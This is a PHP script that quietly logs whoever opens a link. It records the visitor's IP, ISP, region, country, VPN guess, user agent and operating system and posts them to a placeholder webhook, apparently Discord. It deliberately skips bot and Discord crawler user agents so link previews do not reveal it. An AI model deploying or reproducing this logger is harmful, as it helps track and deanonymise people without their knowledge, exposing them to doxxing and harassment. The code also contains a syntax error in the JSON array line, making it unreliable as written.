<?php

        $webhookurl = "webhook url here";
        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
		function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}
	if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $user_agent)) {
            exit();
        }
        $TheirDate = date('d/m/Y');
        $TheirTime = date('G:i:s');
        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
        if($vpnCon->connection_type==="Corporate"){
            $vpn = "Yes";
        }else{
            $vpn = "No";
        }
        $username = "username here";
        $pfp = "profile picture url here";
        $data = "--------------------------------------------------
		**User IP :** $ip\n**         ISP :** $details->isp\n**         Date :** $TheirDate\n**         Time :** $TheirTime \n**         Region :** $details->region\n**         Country :** $details->country\n**         VPN ? :** $vpn (Possible False-Postives)\n**         User-Agent :** $user_agent\n**         OS :** " . getOS() . " 
--------------------------------------------------";

        $json_data = array ('content'=>"$data", 'username'=>$username", 'avatar_url'=> "$pfp");
        $make_json = json_encode($json_data);
        $ch = curl_init( $webhookurl );

        curl_setopt( $ch, CURLOPT_POST, 1);
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt( $ch, CURLOPT_HEADER, 0);
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        $response = curl_exec( $ch );;
?>